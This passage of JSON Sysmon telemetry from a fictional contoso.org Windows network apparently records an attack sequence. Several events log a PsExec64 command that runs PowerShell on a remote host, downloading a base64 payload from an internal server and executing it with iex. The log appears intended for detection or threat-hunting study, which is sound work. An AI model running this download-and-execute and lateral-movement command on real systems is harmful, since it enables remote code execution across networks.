            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\wow64.dll+14591|C:\\windows\\System32\\wow64.dll+13d83|C:\\windows\\System32\\wow64.dll+6523|C:\\windows\\System32\\wow64cpu.dll+1923|C:\\windows\\System32\\wow64.dll+1aefc|C:\\windows\\System32\\wow64.dll+bea0|C:\\windows\\SYSTEM32\\ntdll.dll+792b8|C:\\windows\\SYSTEM32\\ntdll.dll+78e3b|C:\\windows\\SYSTEM32\\ntdll.dll+78dee|C:\\windows\\SYSTEM32\\ntdll.dll+702fc(wow64)|C:\\windows\\System32\\KERNELBASE.dll+d3a96(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189dbb(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189a6c(wow64)|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win32.dll+31c2(wow64)|UNKNOWN(0000000071971000)|UNKNOWN(000000000C6064BB)|UNKNOWN(000000000C6065D3)|UNKNOWN(000000000C60672B)|UNKNOWN(000000000C601965)|UNKNOWN(000000000C601A87)|UNKNOWN(000000000C6071CC)|UNKNOWN(000000000C600506)|UNKNOWN(000000000C6078A8)",
            "event_id": "f39d036ecdc3171873985776cc7d06479153b354fcbb76ac3114242696f15fba",
            "event_type": "process",
            "event_utc": "2020-09-24T20:43:50.884Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "f39d036ecdc3171873985776cc7d06479153b354fcbb76ac3114242696f15fba",
            "image_path": "C:\\windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 8836,
            "process_guid": "{DD483508-0506-5F6D-0000-0010C6303E03}",
            "record_number": "4103033",
            "src_exe": "powershell.exe",
            "src_image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "src_pid": "3544",
            "src_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "subtype": "access",
            "time": "2020-09-24T20:43:50.887Z",
            "timestamp": 1600980230887,
            "uuid": "{DD483508-0506-5F6D-0000-0010C6303E03}"
        },
        {
            "action": "terminate",
            "event_id": "621b96eca65a71b9720d2786fc19c7fc5f51a909ce86ae15e0e74bc0eb36c98f",
            "event_type": "process",
            "event_utc": "2020-09-24T20:43:51.493Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "621b96eca65a71b9720d2786fc19c7fc5f51a909ce86ae15e0e74bc0eb36c98f",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 8836,
            "process_guid": "{DD483508-0506-5F6D-0000-0010C6303E03}",
            "record_number": "4103034",
            "subtype": "terminate",
            "time": "2020-09-24T20:43:51.511Z",
            "timestamp": 1600980231511,
            "uuid": "{DD483508-0506-5F6D-0000-0010C6303E03}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "98f68a8b0f878502340ce1cc54f45cffda4ecd05f76f2cbdc3a251ee701da8c1",
            "event_type": "file",
            "event_utc": "2020-09-24T20:44:01.368Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "98f68a8b0f878502340ce1cc54f45cffda4ecd05f76f2cbdc3a251ee701da8c1",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4103068",
            "subtype": "create",
            "time": "2020-09-24T20:44:01.369Z",
            "timestamp": 1600980241369,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\cmd.exe /C C:\\Users\\Public\\PsExec64.exe -s /accepteula \\\\cmp-447931 cmd /c powershell.exe -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content )))\"",
            "event_id": "4c25cc65fceb77c4d61aef4767d4bb96d1e2c448351c07bb4aa63d80e5bc3d25",
            "event_type": "process",
            "event_utc": "2020-09-24T20:50:30.328Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8FAFBE3C23E2BE4D6A3C063118B9A4F2",
                "SHA256": "4C3EA4C44AAB74350355C419826B8C9E6172C3BD8F0BB5817ECF7BE50B629051"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "4c25cc65fceb77c4d61aef4767d4bb96d1e2c448351c07bb4aa63d80e5bc3d25",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "Cmd.Exe",
            "parent_command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "pid": 10084,
            "ppid": 3544,
            "process_guid": "{DD483508-0696-5F6D-0000-00106A7E5503}",
            "record_number": "4104115",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T20:50:30.336Z",
            "timestamp": 1600980630336,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-0696-5F6D-0000-00106A7E5503}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\wow64.dll+14591|C:\\windows\\System32\\wow64.dll+13d83|C:\\windows\\System32\\wow64.dll+6523|C:\\windows\\System32\\wow64cpu.dll+1923|C:\\windows\\System32\\wow64.dll+1aefc|C:\\windows\\System32\\wow64.dll+bea0|C:\\windows\\SYSTEM32\\ntdll.dll+792b8|C:\\windows\\SYSTEM32\\ntdll.dll+78e3b|C:\\windows\\SYSTEM32\\ntdll.dll+78dee|C:\\windows\\SYSTEM32\\ntdll.dll+702fc(wow64)|C:\\windows\\System32\\KERNELBASE.dll+d3a96(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189dbb(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189a6c(wow64)|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win32.dll+31c2(wow64)|UNKNOWN(0000000071971000)|UNKNOWN(000000000C6064BB)|UNKNOWN(000000000C6065D3)|UNKNOWN(000000000C60672B)|UNKNOWN(000000000C601965)|UNKNOWN(000000000C601A87)|UNKNOWN(000000000C6071CC)|UNKNOWN(000000000C600506)|UNKNOWN(000000000C6078A8)",
            "event_id": "b2d0951306c73a9bb9196d53654a77e82cc88e879d6b617be73aa449dd08a22d",
            "event_type": "process",
            "event_utc": "2020-09-24T20:50:30.323Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "b2d0951306c73a9bb9196d53654a77e82cc88e879d6b617be73aa449dd08a22d",
            "image_path": "C:\\windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 10084,
            "process_guid": "{DD483508-0696-5F6D-0000-00106A7E5503}",
            "record_number": "4104116",
            "src_exe": "powershell.exe",
            "src_image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "src_pid": "3544",
            "src_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "subtype": "access",
            "time": "2020-09-24T20:50:30.337Z",
            "timestamp": 1600980630337,
            "uuid": "{DD483508-0696-5F6D-0000-00106A7E5503}"
        },
        {
            "action": "create",
            "command_line": "C:\\Users\\Public\\PsExec64.exe  -s /accepteula \\\\cmp-447931 cmd /c powershell.exe -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content )))\"",
            "event_id": "03a150c7a908ad0028058bf86198e3344c8c833468ef036f83d61e9de949596c",
            "event_type": "process",
            "event_utc": "2020-09-24T20:50:30.483Z",
            "exe": "PsExec64.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "9321C107D1F7E336CDA550A2BF049108",
                "SHA256": "AD6B98C01EE849874E4B4502C3D7853196F6044240D3271E4AB3FC6E3C08E9A4"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "03a150c7a908ad0028058bf86198e3344c8c833468ef036f83d61e9de949596c",
            "image_path": "C:\\Users\\Public\\PsExec64.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "psexec.c",
            "parent_command_line": "C:\\windows\\system32\\cmd.exe /C C:\\Users\\Public\\PsExec64.exe -s /accepteula \\\\cmp-447931 cmd /c powershell.exe -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content )))\"",
            "parent_exe": "cmd.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "parent_process_guid": "{DD483508-0696-5F6D-0000-00106A7E5503}",
            "pid": 4428,
            "ppid": 10084,
            "process_guid": "{DD483508-0696-5F6D-0000-001094915503}",
            "record_number": "4104117",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T20:50:30.489Z",
            "timestamp": 1600980630489,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-0696-5F6D-0000-001094915503}"
        },
        {
            "action": "start",
            "count": 0,
            "dest_ip": "10.0.0.10",
            "dest_ipv6": "false",
            "dest_port": 49693,
            "event_id": "bab5ea349305d66d5a661b0ab0ec9cb1f366ab0dba20b718197917e745753b5f",
            "event_type": "flow",
            "event_utc": "2020-09-24T20:50:43.838Z",
            "exe": "PsExec64.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "bab5ea349305d66d5a661b0ab0ec9cb1f366ab0dba20b718197917e745753b5f",
            "image_path": "C:\\Users\\Public\\PsExec64.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 4428,
            "process_guid": "{DD483508-0696-5F6D-0000-001094915503}",
            "record_number": "4104129",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.3",
            "src_ipv6": "false",
            "src_port": 54101,
            "subtype": "start",
            "time": "2020-09-24T20:50:33.012Z",
            "timestamp": 1600980633012,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-0696-5F6D-0000-001094915503}"
        },
        {
            "action": "start",
            "count": 0,
            "dest_ip": "10.0.0.10",
            "dest_ipv6": "false",
            "dest_port": 135,
            "event_id": "83a65867f30f10ba2f39051d6f89bd93733e252ab03b50a9cd3d31237293914a",
            "event_type": "flow",
            "event_utc": "2020-09-24T20:50:43.650Z",
            "exe": "PsExec64.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "83a65867f30f10ba2f39051d6f89bd93733e252ab03b50a9cd3d31237293914a",
            "image_path": "C:\\Users\\Public\\PsExec64.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 4428,
            "process_guid": "{DD483508-0696-5F6D-0000-001094915503}",
            "record_number": "4104128",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.3",
            "src_ipv6": "false",
            "src_port": 54100,
            "subtype": "start",
            "time": "2020-09-24T20:50:33.012Z",
            "timestamp": 1600980633012,
            "transport": "tcp",
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-0696-5F6D-0000-001094915503}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "c7f36b7e26a1383c427444aaf024f328a9b455f9636aa972c730cc3596388b52",
            "event_type": "file",
            "event_utc": "2020-09-24T21:15:01.787Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "c7f36b7e26a1383c427444aaf024f328a9b455f9636aa972c730cc3596388b52",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4104887",
            "subtype": "create",
            "time": "2020-09-24T21:15:01.790Z",
            "timestamp": 1600982101790,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "terminate",
            "event_id": "47bfa74a7ff14baa15794dc71b9ad979e58d8683ac3a15a9de22028cad8dc3bc",
            "event_type": "process",
            "event_utc": "2020-09-24T21:17:45.407Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "47bfa74a7ff14baa15794dc71b9ad979e58d8683ac3a15a9de22028cad8dc3bc",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 10084,
            "process_guid": "{DD483508-0696-5F6D-0000-00106A7E5503}",
            "record_number": "4104919",
            "subtype": "terminate",
            "time": "2020-09-24T21:17:45.420Z",
            "timestamp": 1600982265420,
            "uuid": "{DD483508-0696-5F6D-0000-00106A7E5503}"
        },
        {
            "action": "start",
            "count": 2,
            "dest_fqdn": "srv-dc-11.contoso.org",
            "dest_hostname": "srv-dc-11",
            "dest_ip": "10.0.0.7",
            "dest_ipv6": "false",
            "dest_port": 389,
            "event_id": "fc440fefde4f059777207a85df4c23f1ed30b11d6b6fe711204df49597d2bdb4",
            "event_type": "flow",
            "event_utc": "2020-09-24T21:17:57.624Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "fc440fefde4f059777207a85df4c23f1ed30b11d6b6fe711204df49597d2bdb4",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4104923",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.1",
            "src_ipv6": "false",
            "src_port": 54900,
            "subtype": "start",
            "time": "2020-09-24T21:17:47.231Z",
            "timestamp": 1600982267231,
            "transport": "udp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 0,
            "dest_fqdn": "srv-dc-34.contoso.org",
            "dest_hostname": "srv-dc-34",
            "dest_ip": "10.0.0.11",
            "dest_ipv6": "false",
            "dest_port": 389,
            "event_id": "03ec285e6d86fda0fffc995f2476890fc7ea3760a5649d3024a70fcefb475df0",
            "event_type": "flow",
            "event_utc": "2020-09-24T21:17:58.683Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "03ec285e6d86fda0fffc995f2476890fc7ea3760a5649d3024a70fcefb475df0",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4104950",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.1",
            "src_ipv6": "false",
            "src_port": 63404,
            "subtype": "start",
            "time": "2020-09-25T13:25:35.174Z",
            "timestamp": 1601040335174,
            "transport": "udp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
